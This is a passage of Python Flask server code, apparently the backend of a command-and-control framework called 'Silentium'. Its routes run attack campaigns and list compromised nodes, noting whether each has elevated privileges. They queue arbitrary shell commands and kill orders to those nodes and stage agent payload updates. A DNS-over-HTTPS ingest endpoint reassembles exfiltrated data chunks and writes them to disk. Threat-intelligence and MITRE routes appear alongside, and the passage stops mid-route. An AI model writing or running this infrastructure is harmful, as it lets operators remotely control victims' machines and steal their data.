# ══════════════════════════════════════════════════════════════════════════════
# OPERATOR DASHBOARD — CORE DATA ROUTES
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/stats")
@_require_permission("dashboard:view")
def api_stats():
    # Return degraded stats if DB unavailable rather than 500
    hlc_ts = _hlc.peek().to_dict() if _hlc else {}
    base = {
        "active_nodes": 0, "completed_tasks": 0,
        "pending_tasks": 0, "running_tasks": 0,
        "vuln_count": 0, "crit_count": 0,
        "campaigns": 0, "hlc": hlc_ts,
        "distributed": _DISTRIBUTED_AVAILABLE,
        "dlq_depth": _dlq.stats().get("current_depth", 0) if _dlq else 0,
        "task_queue_depth": len(_ptq) if _ptq else 0,
        "total_events": 0, "exfil_receipts": 0,
    }
    try:
        conn = get_pg()
        if conn is None:
            return jsonify({**base, "degraded": True, "reason": "database unavailable"}), 200
        from psycopg2.extras import RealDictCursor as _RDC
        with conn.cursor() as c:
            c.execute("SELECT COUNT(*) FROM nodes WHERE status='active' AND last_seen > NOW()-INTERVAL '5 minutes'")
            base["active_nodes"] = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM tasks WHERE status='completed'")
            base["completed_tasks"] = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM tasks WHERE status='queued'")
            base["pending_tasks"] = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM tasks WHERE status='running'")
            base["running_tasks"] = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM vulnerabilities")
            base["vuln_count"] = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM vulnerabilities WHERE severity='CRITICAL'")
            base["crit_count"] = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM campaigns WHERE status='active'")
            base["campaigns"] = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM events WHERE created_at > NOW()-INTERVAL '24 hours'")
            base["total_events"] = c.fetchone()[0]
        if _pool:
            try: _pool._pool.putconn(conn)
            except Exception as _e: log.debug("suppressed exception: %s", _e)
        return jsonify(base)
    except Exception as e:
        log.warning("api_stats db error: %s", e)
        return jsonify({**base, "degraded": True, "reason": str(e)}), 200


@app.route("/api/campaigns", methods=["GET"])
@_require_permission("nodes:view")
def list_campaigns():
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        c.execute("""
            SELECT ca.*, COUNT(t.id) as task_count,
                   COALESCE(SUM(t.vuln_count),0) as total_vulns
            FROM campaigns ca
            LEFT JOIN tasks t ON t.campaign_id=ca.id
            GROUP BY ca.id ORDER BY ca.created_at DESC
        """)
        rows = [dict(r) for r in c.fetchall()]
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify(rows)


@app.route("/api/campaigns", methods=["POST"])
@_require_permission("campaigns:create")
def create_campaign():
    d    = request.get_json(silent=True) or {}
    name = d.get("name") or "campaign-" + uuid.uuid4().hex[:8]
    desc = d.get("description", "")
    conn = get_pg()
    with conn.cursor() as c:
        c.execute("INSERT INTO campaigns(name,description,operator) VALUES(%s,%s,%s) RETURNING id", (name, desc, _operator()))
        cid = c.fetchone()[0]
        conn.commit()
    if _pool:
        _pool._pool.putconn(conn)
    if _sm:
        _sm.set(f"campaign:{cid}:name", name)
    emit("campaign_created", f"Campaign '{name}' created by {_operator()}", "info")
    return jsonify({"campaign_id": cid, "name": name}), 201


@app.route("/api/campaigns/<int:cid>", methods=["GET"])
@_require_permission("nodes:view")
def get_campaign(cid: int):
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        c.execute("SELECT * FROM campaigns WHERE id=%s", (cid,))
        row = c.fetchone()
        if not row:
            if _pool: _pool._pool.putconn(conn)
            return _err("Not found.", status=404)
        c.execute("SELECT COUNT(*) FROM tasks WHERE campaign_id=%s", (cid,))
        row = dict(row)
        row["task_count"] = c.fetchone()[0]
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify(row)


@app.route("/api/campaigns/<int:cid>/targets", methods=["POST"])
@_require_permission("campaigns:create")
def add_targets(cid: int):
    d       = request.get_json(silent=True) or {}
    targets = d.get("targets", [])
    prio    = int(d.get("priority", 1))
    action  = d.get("action", "recon")
    added   = []
    conn = get_pg()
    for t in targets:
        if not t or not isinstance(t, str):
            continue
        tid = str(uuid.uuid4())
        with conn.cursor() as c:
            c.execute(
                "INSERT INTO tasks(task_uuid,campaign_id,target,action,priority,status) "
                "VALUES(%s,%s,%s,%s,%s,'queued')",
                (tid, cid, t.strip(), action, prio)
            )
        if _ptq:
            _ptq.push(PriorityTask(priority=prio, task_id=tid,
                                    payload={"task_uuid": tid, "target": t.strip(), "action": action}))
        added.append(tid)
    conn.commit()
    if _pool:
        _pool._pool.putconn(conn)
    emit("targets_added", f"{len(added)} targets added to campaign {cid} by {_operator()}", "info")
    return jsonify({"added": len(added), "task_uuids": added})


@app.route("/api/tasks", methods=["GET"])
@_require_permission("nodes:view")
def list_tasks():
    cid = request.args.get("campaign")
    stt = request.args.get("status")
    lim = min(int(request.args.get("limit", 200)), 1000)
    page, per_page = _pagination()
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        sql  = ("SELECT id,task_uuid,campaign_id,target,action,assigned_to,status,"
                "priority,created_at,completed_at,vuln_count,crit_count,duration FROM tasks")
        args: list = []
        wh:   list = []
        if cid: wh.append("campaign_id=%s"); args.append(cid)
        if stt: wh.append("status=%s"); args.append(stt)
        if wh:  sql += " WHERE " + " AND ".join(wh)
        sql += " ORDER BY created_at DESC LIMIT %s OFFSET %s"
        args += [per_page, (page - 1) * per_page]
        c.execute(sql, args)
        rows = [dict(r) for r in c.fetchall()]
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify({"tasks": rows, "page": page, "per_page": per_page})


@app.route("/api/tasks", methods=["POST"])
@_require_permission("campaigns:create")
def create_task():
    d      = request.get_json(silent=True) or {}
    target = d.get("target", "")
    action = d.get("action", "recon")
    node   = d.get("node_id")
    cid    = d.get("campaign_id")
    prio   = int(d.get("priority", 1))
    extra  = d.get("extra_args", {})
    if not target:
        return _err("target required.")
    task_uuid = str(uuid.uuid4())
    conn = get_pg()
    with conn.cursor() as c:
        c.execute(
            "INSERT INTO tasks(task_uuid,target,action,assigned_to,campaign_id,status,priority,extra_args,created_at) "
            "VALUES(%s,%s,%s,%s,%s,'queued',%s,%s::jsonb,NOW())",
            (task_uuid, target, action, node, cid, prio, json.dumps(extra))
        )
        conn.commit()
    if _pool:
        _pool._pool.putconn(conn)
    if _ptq:
        _ptq.push(PriorityTask(priority=prio, task_id=task_uuid,
                                payload={"task_uuid": task_uuid, "target": target, "action": action}))
    emit("task_created", f"Task {task_uuid[:12]} ({action}→{target}) by {_operator()}", "info")
    return jsonify({"status": "created", "task_uuid": task_uuid}), 201


@app.route("/api/tasks/<task_uuid>", methods=["GET"])
@_require_permission("nodes:view")
def get_task(task_uuid: str):
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        c.execute("SELECT * FROM tasks WHERE task_uuid=%s", (task_uuid,))
        row = c.fetchone()
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify(dict(row)) if row else _err("Not found.", status=404)


@app.route("/api/tasks/<task_uuid>/requeue", methods=["POST"])
@_require_permission("campaigns:create")
def requeue_task(task_uuid: str):
    conn = get_pg()
    with conn.cursor() as c:
        c.execute("SELECT task_uuid FROM tasks WHERE task_uuid=%s", (task_uuid,))
        if not c.fetchone():
            if _pool: _pool._pool.putconn(conn)
            return _err("Not found.", status=404)
        c.execute(
            "UPDATE tasks SET status='queued',started_at=NULL,completed_at=NULL,result=NULL "
            "WHERE task_uuid=%s", (task_uuid,)
        )
        conn.commit()
    if _pool:
        _pool._pool.putconn(conn)
    emit("task_requeued", f"Task {task_uuid[:12]} requeued by {_operator()}", "info")
    return jsonify({"status": "requeued", "task_uuid": task_uuid})


@app.route("/api/tasks/<task_uuid>/cancel", methods=["POST"])
@_require_permission("campaigns:create")
def cancel_task(task_uuid: str):
    conn = get_pg()
    with conn.cursor() as c:
        c.execute(
            "UPDATE tasks SET status='cancelled',completed_at=NOW() "
            "WHERE task_uuid=%s AND status IN ('queued','running')",
            (task_uuid,)
        )
        affected = c.rowcount
        conn.commit()
    if _pool:
        _pool._pool.putconn(conn)
    if not affected:
        return _err("Task not found or already finished.", status=404)
    return jsonify({"status": "cancelled", "task_uuid": task_uuid})


@app.route("/api/vulnerabilities", methods=["GET"])
@_require_permission("nodes:view")
def list_vulns():
    sev  = request.args.get("severity")
    vtyp = request.args.get("type")
    lim  = min(int(request.args.get("limit", 500)), 5000)
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        sql  = "SELECT * FROM vulnerabilities"
        args: list = []
        wh:   list = []
        if sev:  wh.append("severity=%s");        args.append(sev)
        if vtyp: wh.append("vuln_type ILIKE %s"); args.append(f"%{vtyp}%")
        if wh:   sql += " WHERE " + " AND ".join(wh)
        sql += " ORDER BY found_at DESC LIMIT %s"
        args.append(lim)
        c.execute(sql, args)
        rows = [dict(r) for r in c.fetchall()]
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify(rows)


@app.route("/api/nodes", methods=["GET"])
@_require_permission("nodes:view")
def list_nodes():
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        c.execute("""
            SELECT node_id, ip_address, external_ip, last_seen, status,
                   capabilities, hostname, os_type, is_elevated, version,
                   username, arch, trust_score
            FROM nodes ORDER BY last_seen DESC
        """)
        rows = [dict(r) for r in c.fetchall()]
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify(rows)


@app.route("/api/nodes/<node_id>", methods=["GET"])
@_require_permission("nodes:view")
def get_node(node_id: str):
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        c.execute("SELECT * FROM nodes WHERE node_id=%s", (node_id,))
        row = c.fetchone()
        if not row:
            if _pool: _pool._pool.putconn(conn)
            return _err("Not found.", status=404)
        c.execute("SELECT task_uuid,target,action,status,vuln_count,completed_at "
                  "FROM tasks WHERE assigned_to=%s ORDER BY created_at DESC LIMIT 20",
                  (node_id,))
        row = dict(row)
        row["recent_tasks"] = [dict(r) for r in c.fetchall()]
        # Enrich with ring position
        if _ring:
            row["ring_node"] = _ring.get_node(node_id)
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify(row)


@app.route("/api/nodes/<node_id>/command", methods=["POST"])
@_require_permission("nodes:command")
def send_node_command(node_id: str):
    d   = request.get_json(silent=True) or {}
    cmd = d.get("command", "")
    if not cmd:
        return _err("command required.")
    if R:
        R.rpush(f"cmd:{node_id}", cmd)
    emit("command_queued", f"Command queued → {node_id[:12]} by {_operator()}", "info")
    return jsonify({"status": "queued"})


@app.route("/api/nodes/<node_id>/kill", methods=["POST"])
@_require_permission("nodes:kill")
def kill_node(node_id: str):
    if R:
        R.rpush(f"cmd:{node_id}", json.dumps({"action": "die"}))
    conn = get_pg()
    with conn.cursor() as c:
        c.execute("UPDATE nodes SET status='killed' WHERE node_id=%s", (node_id,))
        conn.commit()
    if _pool:
        _pool._pool.putconn(conn)
    emit("node_killed", f"Kill sent → {node_id[:12]} by {_operator()}", "critical")
    return jsonify({"status": "kill_queued"})


@app.route("/api/node/command", methods=["POST"])
@_require_permission("nodes:command")
def node_command_compat():
    """Dashboard compat: POST /api/node/command {node_id, command}."""
    d       = request.get_json(silent=True) or {}
    node_id = d.get("node_id", "")
    cmd     = d.get("command", "")
    if not node_id or not cmd:
        return _err("node_id and command required.")
    if R:
        R.rpush(f"cmd:{node_id}", cmd)
    emit("command_queued", f"Command queued → {node_id[:12]} by {_operator()}", "info")
    return jsonify({"status": "queued"})


@app.route("/api/events", methods=["GET"])
@_require_permission("nodes:view")
def list_events():
    lim  = min(int(request.args.get("limit", 200)), 2000)
    kind = request.args.get("kind")
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        sql  = "SELECT * FROM events"
        args: list = []
        if kind:
            sql += " WHERE event_type=%s"
            args.append(kind)
        sql += " ORDER BY created_at DESC LIMIT %s"
        args.append(lim)
        c.execute(sql, args)
        rows = [dict(r) for r in c.fetchall()]
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify(rows)


@app.route("/api/agent/update", methods=["POST"])
@_require_permission("nodes:command")
def stage_update():
    d    = request.get_json(silent=True) or {}
    code = d.get("code", "")
    if not code:
        return _err("code required.")
    if R:
        R.set("agent_update", code, ex=3600)
    emit("agent_update_staged", f"Agent payload staged by {_operator()}", "high")
    return jsonify({"status": "staged"})


@app.route("/api/relays", methods=["GET"])
@_require_permission("nodes:view")
def list_relays():
    relays = []
    if R:
        relay_keys = R.keys("relay:hb:*") or []
        for key in relay_keys:
            try:
                raw = R.get(key)
                if raw:
                    relays.append(json.loads(raw))
            except Exception as _exc:
                log.debug("list_relays: %s", _exc)
    if not relays:
        static = os.environ.get("RELAY_ADDR", "")
        if static:
            relays.append({"relay_id": "static-0", "addr": static, "status": "unknown"})
    return jsonify(relays)


@app.route("/api/relays/stop", methods=["POST"])
@_require_permission("nodes:kill")
def stop_relays():
    count = 0
    if R:
        count = R.publish("relay:control", json.dumps({"cmd": "STOP", "ts": int(time.time())}))
        R.setex("relay:stop_flag", 120, "1")
    emit("relay_stop", f"Relay stop broadcast by {_operator()}", "high")
    return jsonify({"status": "stop_broadcast", "subscribers_notified": count})


@app.route("/api/findings", methods=["GET"])
@_require_permission("nodes:view")
def list_findings():
    lim      = min(int(request.args.get("limit", 500)), 5000)
    sev      = request.args.get("severity")
    category = request.args.get("category")
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        sql  = "SELECT * FROM findings"
        args: list = []
        wh:   list = []
        if sev:      wh.append("severity=%s");        args.append(sev)
        if category: wh.append("category ILIKE %s");  args.append(f"%{category}%")
        if wh:       sql += " WHERE " + " AND ".join(wh)
        sql += " ORDER BY found_at DESC LIMIT %s"
        args.append(lim)
        c.execute(sql, args)
        rows = [dict(r) for r in c.fetchall()]
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify(rows)


@app.route("/api/exfil/receipts", methods=["GET"])
@_require_permission("nodes:view")
def list_exfil_receipts():
    lim = min(int(request.args.get("limit", 200)), 2000)
    conn = get_pg()
    from psycopg2.extras import RealDictCursor as _RDC
    with conn.cursor(cursor_factory=_RDC) as c:
        c.execute(
            "SELECT id,node_id,event_type AS kind,payload,created_at AS ts "
            "FROM events WHERE event_type ILIKE 'exfil.%%' "
            "ORDER BY created_at DESC LIMIT %s", (lim,)
        )
        rows = [dict(r) for r in c.fetchall()]
    if _pool:
        _pool._pool.putconn(conn)
    return jsonify(rows)


@app.route("/api/silentium/status", methods=["GET"])
@_require_permission("nodes:view")
def silentium_status():
    with _silentium_sess_lock:
        active_sessions = len(_silentium_sessions)
    return jsonify({
        "version":               "10.0-silentium",
        "ecdhe_available":       _SILENTIUM_HAS_ECDHE,
        "active_ecdhe_sessions": active_sessions,
        "profile_loaded":        os.environ.get("PROFILE_FILE", "") != "",
        "doh_domain":            os.environ.get("DOH_DOMAIN", ""),
        "distributed_available": _DISTRIBUTED_AVAILABLE,
        "ts":                    int(time.time()),
        "hlc":                   _hlc.peek().to_dict() if _hlc else {},
    })


@app.route("/doh/ingest", methods=["GET", "POST"])
def silentium_doh_ingest():
    try:
        data    = request.get_json(force=True, silent=True) or {}
        sess    = data.get("session_id", "?")
        seq     = int(data.get("seq", 0))
        total   = int(data.get("total", 1))
        chunk   = base64.b64decode(data.get("chunk", ""))
        node_id = data.get("node_id", "?")
        label   = data.get("label", "doh_exfil")

        if R:
            R.setex(f"doh:{sess}:{seq}", 3600, chunk)
            all_chunks = [R.get(f"doh:{sess}:{i}") for i in range(total)]
            if all(all_chunks):
                reassembled = b"".join(all_chunks)
                out_dir = os.path.join("/tmp/aegis_exfil", node_id)
                os.makedirs(out_dir, exist_ok=True)
                out_path = os.path.join(out_dir, f"{label}-{sess[:8]}")
                with open(out_path, "wb") as f:
                    f.write(reassembled)
                for i in range(total):
                    R.delete(f"doh:{sess}:{i}")
                emit("exfil_complete", f"DoH exfil {label} ({len(reassembled)}B) from {node_id[:12]}", "high")
                return jsonify({"status": "complete", "bytes": len(reassembled)})
            received = sum(1 for c in all_chunks if c)
        else:
            received = 1
        return jsonify({"status": "partial", "received": received, "total": total})
    except Exception as e:
        log.error("DoH ingest error: %s", e)
        return _err(str(e), status=500, code="INGEST_ERROR")


# ══════════════════════════════════════════════════════════════════════════════
# DISTRIBUTED SYSTEMS API  /api/distributed/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/distributed/status")
@_require_permission("nodes:view")
def distributed_status():
    """Overview of all distributed subsystem states."""
    return jsonify({
        "available": _DISTRIBUTED_AVAILABLE,
        "hlc":       _hlc.peek().to_dict() if _hlc else None,
        "wal":       _wal.stats() if _wal else None,
        "dlq":       _dlq.stats() if _dlq else None,
        "task_queue_depth": len(_ptq) if _ptq else 0,
        "fencing_epoch":    _fencing.current_epoch if _fencing else None,
        "ring_nodes":       _ring.nodes() if _ring else [],
        "bloom_count":      _bloom.estimated_count() if _bloom else 0,
    })


@app.route("/api/distributed/hlc")
@_require_permission("nodes:view")
def hlc_tick():
    """Return a new HLC timestamp (advances the clock)."""
    if not _hlc:
        return _err("Distributed module unavailable.", status=503)
    ts = _hlc.now()
    return jsonify({"hlc": ts.to_dict(), "str": str(ts)})


@app.route("/api/distributed/merkle", methods=["POST"])
@_require_permission("nodes:view")
def merkle_compute():
    """Compute a Merkle tree over the provided state dict and return the root."""
    if not _DISTRIBUTED_AVAILABLE:
        return _err("Distributed module unavailable.", status=503)
    d = request.get_json(silent=True) or {}
    state = d.get("state", {})
    if not isinstance(state, dict):
        return _err("state must be a JSON object.")
    tree = MerkleTree({str(k): str(v) for k, v in state.items()})
    return jsonify({
        "root_hash":  tree.root_hash,
        "leaf_count": tree.leaf_count,
        "leaves":     [{"key": n.key, "hash": n.hash} for n in tree._leaves[:50]],
    })


@app.route("/api/distributed/wal", methods=["GET"])
@_require_permission("nodes:view")
def wal_stats():
    if not _wal:
        return _err("WAL unavailable.", status=503)
    return jsonify(_wal.stats())


@app.route("/api/distributed/wal/append", methods=["POST"])
@_require_permission("nodes:command")
def wal_append():
    if not _sm:
        return _err("WAL state machine unavailable.", status=503)
    d   = request.get_json(silent=True) or {}
    key = d.get("key", "")
    val = d.get("value")
    op  = d.get("op", "set")
    if not key:
        return _err("key required.")
    if op == "delete":
        entry = _sm.delete(key)
    else:
        entry = _sm.set(key, val)
    if not entry:
        return _err("Key not found for delete.", status=404)
    return jsonify({"index": entry.index, "term": entry.term, "op": op, "key": key})


@app.route("/api/distributed/fencing/epoch", methods=["GET"])
@_require_permission("nodes:view")
def fencing_epoch():
    if not _fencing:
        return _err("Fencing unavailable.", status=503)
    return jsonify({"epoch": _fencing.current_epoch})


@app.route("/api/distributed/fencing/new-epoch", methods=["POST"])
@_require_permission("nodes:kill")
def fencing_new_epoch():
    if not _fencing:
        return _err("Fencing unavailable.", status=503)
    epoch = _fencing.new_epoch()
    emit("fencing_epoch_bumped", f"Fencing epoch → {epoch} by {_operator()}", "high")
    return jsonify({"epoch": epoch})


@app.route("/api/distributed/ring", methods=["GET"])
@_require_permission("nodes:view")
def ring_status():
    if not _ring:
        return _err("Consistent hash ring unavailable.", status=503)
    return jsonify({"nodes": _ring.nodes()})


@app.route("/api/distributed/ring/route", methods=["POST"])
@_require_permission("nodes:view")
def ring_route():
    if not _ring:
        return _err("Consistent hash ring unavailable.", status=503)
    d   = request.get_json(silent=True) or {}
    key = d.get("key", "")
    n   = min(int(d.get("n", 1)), 5)
    if not key:
        return _err("key required.")
    nodes = _ring.get_nodes(key, n)
    return jsonify({"key": key, "nodes": nodes})


@app.route("/api/distributed/bloom", methods=["POST"])
@_require_permission("nodes:view")
def bloom_check():
    if not _bloom:
        return _err("Bloom filter unavailable.", status=503)
    d    = request.get_json(silent=True) or {}
    item = d.get("item", "")
    if not item:
        return _err("item required.")
    return jsonify({"item": item, "present": item in _bloom,
                    "estimated_count": _bloom.estimated_count()})


@app.route("/api/distributed/dlq", methods=["GET"])
@_require_permission("nodes:view")
def dlq_list():
    if not _dlq:
        return _err("DLQ unavailable.", status=503)
    source   = request.args.get("source")
    resolved = request.args.get("resolved")
    if resolved is not None:
        resolved = resolved.lower() == "true"
    entries = _dlq.list_entries(source=source or None,
                                resolved=resolved,
                                limit=int(request.args.get("limit", 100)))
    return jsonify({"entries": [e.to_dict() for e in entries],
                    "stats": _dlq.stats()})


@app.route("/api/distributed/dlq/<entry_id>/resolve", methods=["POST"])
@_require_permission("nodes:command")
def dlq_resolve(entry_id: str):
    if not _dlq:
        return _err("DLQ unavailable.", status=503)
    ok = _dlq.resolve(entry_id)
    return jsonify({"resolved": ok}) if ok else _err("Entry not found.", status=404)


@app.route("/api/distributed/task-queue", methods=["GET"])
@_require_permission("nodes:view")
def task_queue_stats():
    if not _ptq:
        return _err("Priority task queue unavailable.", status=503)
    return jsonify(_ptq.stats())


@app.route("/api/distributed/chaos/experiments", methods=["GET"])
@_require_permission("nodes:view")
def chaos_list():
    if not _chaos:
        return _err("Chaos framework unavailable.", status=503)
    return jsonify({
        "experiments": list(_chaos._experiments.keys()),
        "summary":     _chaos.summary(),
        "results":     [r.to_dict() for r in _chaos.results()[-20:]],
    })


# ══════════════════════════════════════════════════════════════════════════════
# BACKGROUND THREADS
# ══════════════════════════════════════════════════════════════════════════════

def _node_watchdog():
    """Mark nodes as dead after 10 min of inactivity."""
    while True:
        time.sleep(60)
        try:
            conn = get_pg()
            with conn.cursor() as c:
                c.execute("""
                    UPDATE nodes SET status='dead'
                    WHERE status='active'
                      AND last_seen < NOW()-INTERVAL '10 minutes'
                """)
                dead = c.rowcount
                conn.commit()
            if _pool:
                _pool._pool.putconn(conn)
            if dead > 0:
                emit("nodes_dead", f"{dead} node(s) marked dead", "high")
        except Exception as e:
            log.warning("Watchdog error: %s", e)


threading.Thread(target=_node_watchdog, daemon=True, name="watchdog").start()


def _mesh_listener():
    """Peer-to-peer mesh UDP listener."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", _MESH_PORT))
        log.info("Mesh UDP listener on :%d", _MESH_PORT)
        while True:
            try:
                data, addr = sock.recvfrom(8192)
                if R:
                    R.publish("mesh", json.dumps({
                        "from": addr[0], "port": addr[1],
                        "data": data.decode(errors="replace")[:500]
                    }))
                sock.sendto(b"ACK", addr)
            except Exception as e:
                if "Errno" in type(e).__name__:
                    time.sleep(0.1)
    except Exception as e:
        log.warning("Mesh listener failed to bind: %s", e)


threading.Thread(target=_mesh_listener, daemon=True, name="mesh").start()


# ══════════════════════════════════════════════════════════════════════════════
# v11 — INTELLIGENCE ROUTES  /api/intelligence/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/intelligence/status")
@_require_permission("nodes:view")
def intel_status():
    return jsonify({
        "available":        _INTELLIGENCE_AVAILABLE,
        "ioc_stats":        _ioc_mgr.stats()        if _ioc_mgr        else None,
        "mitre_stats":      _mitre.stats()           if _mitre          else None,
        "graph_stats":      _threat_graph.stats()    if _threat_graph   else None,
    })


# ── IOC Manager ───────────────────────────────────────────────────────────────

@app.route("/api/intelligence/ioc", methods=["GET"])
@_require_permission("nodes:view")
def ioc_list():
    if not _ioc_mgr:
        return _err("Intelligence module unavailable.", status=503)
    p = _pagination()
    ioc_type = request.args.get("type")
    severity = request.args.get("severity")
    tags     = request.args.getlist("tag")
    results = _ioc_mgr.search(
        tags     = tags or None,
        ioc_type = IOCType(ioc_type)   if ioc_type else None,
        severity = IOCSeverity(severity) if severity else None,
        limit    = p["limit"],
        offset   = p["offset"],
    )
    return jsonify({"iocs": [i.to_dict() for i in results],
                    "stats": _ioc_mgr.stats()})


@app.route("/api/intelligence/ioc", methods=["POST"])
@_require_permission("campaigns:write")
def ioc_create():
    if not _ioc_mgr:
        return _err("Intelligence module unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    required = ("ioc_type", "value")
    for f in required:
        if not body.get(f):
            return _err(f"Missing field: {f}", status=400)
    try:
        ioc = IOC(
            ioc_id      = "",
            ioc_type    = IOCType(body["ioc_type"]),
            value       = body["value"],
            confidence  = float(body.get("confidence", 0.8)),
            source      = body.get("source", _operator()),
            tags        = body.get("tags", []),
            description = body.get("description", ""),
            ttl_seconds = body.get("ttl_seconds"),
            meta        = body.get("meta", {}),
        )
        ioc_id = _ioc_mgr.add(ioc)
        emit("ioc.created", f"IOC {ioc.ioc_type.value}:{ioc.value} added", "info")
        _emit_audit("ioc.created", f"IOC {ioc_id} created by {_operator()}")
        return jsonify({"ioc_id": ioc_id, "ioc": _ioc_mgr.get(ioc_id).to_dict()}), 201
    except (ValueError, KeyError) as e:
        return _err(str(e), status=400)


@app.route("/api/intelligence/ioc/bulk", methods=["POST"])
@_require_permission("campaigns:write")
def ioc_bulk_import():
    if not _ioc_mgr:
        return _err("Intelligence module unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    data = body.get("iocs", [])
    if not isinstance(data, list):
        return _err("iocs must be a list.", status=400)
    count = _ioc_mgr.import_bulk(data)
    emit("ioc.bulk_import", f"{count} IOCs imported", "info")
    return jsonify({"imported": count, "stats": _ioc_mgr.stats()})


@app.route("/api/intelligence/ioc/export")
@_require_permission("campaigns:write")
def ioc_export():
    if not _ioc_mgr:
        return _err("Intelligence module unavailable.", status=503)
    return jsonify({"iocs": _ioc_mgr.export_all(), "count": len(_ioc_mgr.export_all())})


@app.route("/api/intelligence/ioc/<ioc_id>", methods=["GET"])
@_require_permission("nodes:view")
def ioc_get(ioc_id: str):
    if not _ioc_mgr:
        return _err("Intelligence module unavailable.", status=503)
    ioc = _ioc_mgr.get(ioc_id)
    return jsonify(ioc.to_dict()) if ioc else _err("IOC not found.", status=404)


@app.route("/api/intelligence/ioc/<ioc_id>", methods=["DELETE"])
@_require_permission("campaigns:write")
def ioc_delete(ioc_id: str):
    if not _ioc_mgr:
        return _err("Intelligence module unavailable.", status=503)
    ok = _ioc_mgr.remove(ioc_id)
    if ok:
        _emit_audit("ioc.deleted", f"IOC {ioc_id} deleted by {_operator()}")
    return jsonify({"deleted": ok}) if ok else _err("IOC not found.", status=404)


@app.route("/api/intelligence/ioc/lookup", methods=["POST"])
@_require_permission("nodes:view")
def ioc_lookup():
    if not _ioc_mgr:
        return _err("Intelligence module unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    value = body.get("value", "")
    kind  = body.get("type", "")
    if not value:
        return _err("value required.", status=400)
    if kind == "ip":
        matches = _ioc_mgr.lookup_ip(value)
    elif kind == "domain":
        matches = _ioc_mgr.lookup_domain(value)
    elif kind == "hash":
        matches = _ioc_mgr.lookup_hash(value)
    else:
        matches = _ioc_mgr.lookup(value)
    return jsonify({
        "matched":    len(matches) > 0,
        "match_count": len(matches),
        "iocs":       [i.to_dict() for i in matches],
    })


# ── MITRE ATT&CK ──────────────────────────────────────────────────────────────

@app.route("/api/intelligence/mitre/techniques")
@_require_permission("nodes:view")
def mitre_techniques():
    if not _mitre:
        return _err("MITRE module unavailable.", status=503)
    tactic = request.args.get("tactic")
    if tactic:
        techs = _mitre.techniques_for_tactic(tactic)
    else:
        techs = list(_mitre._techniques.values())
    return jsonify({"techniques": [t.to_dict() for t in techs],
                    "count": len(techs)})


@app.route("/api/intelligence/mitre/techniques/<technique_id>")
@_require_permission("nodes:view")
def mitre_technique(technique_id: str):
    if not _mitre:
        return _err("MITRE module unavailable.", status=503)
    t = _mitre.get_technique(technique_id)
    return jsonify(t.to_dict()) if t else _err("Technique not found.", status=404)


@app.route("/api/intelligence/mitre/observe", methods=["POST"])
@_require_permission("campaigns:write")
def mitre_observe():
    if not _mitre:
        return _err("MITRE module unavailable.", status=503)
    body = request.get_json(silent=True) or {}
    technique_id = body.get("technique_id", "")
    if not technique_id:
        return _err("technique_id required.", status=400)
    obs_id = _mitre.observe(
        technique_id = technique_id,
        campaign_id  = body.get("campaign_id"),
        node_id      = body.get("node_id"),
        confidence   = float(body.get("confidence", 0.8)),
        evidence     = body.get("evidence", ""),
        operator     = _operator(),
        tags         = body.get("tags", []),
    )
    emit("mitre.observe", f"TTP {technique_id} observed", "info")
    return jsonify({"obs_id": obs_id}), 201


@app.route("/api/intelligence/mitre/observations")
@_require_permission("nodes:view")
def mitre_observations():
    if not _mitre:
        return _err("MITRE module unavailable.", status=503)
    return jsonify({"observations": _mitre.all_observations(limit=200),
                    "stats": _mitre.stats()})


@app.route("/api/intelligence/mitre/campaign/<campaign_id>")
@_require_permission("nodes:view")
def mitre_campaign(campaign_id: str):
    if not _mitre:
        return _err("MITRE module unavailable.", status=503)
    return jsonify(_mitre.campaign_profile(campaign_id))


@app.route("/api/intelligence/mitre/navigator")
@_require_permission("nodes:view")
def mitre_navigator():
    if not _mitre:
        return _err("MITRE module unavailable.", status=503)
    campaign_id = request.args.get("campaign_id")
    return jsonify(_mitre.navigator_export(campaign_id=campaign_id))


# ── Threat Graph ───────────────────────────────────────────────────────────────

@app.route("/api/intelligence/graph", methods=["GET"])
@_require_permission("nodes:view")
def graph_export():
    if not _threat_graph:
        return _err("Threat graph unavailable.", status=503)
    return jsonify(_threat_graph.export())


@app.route("/api/intelligence/graph/node", methods=["POST"])
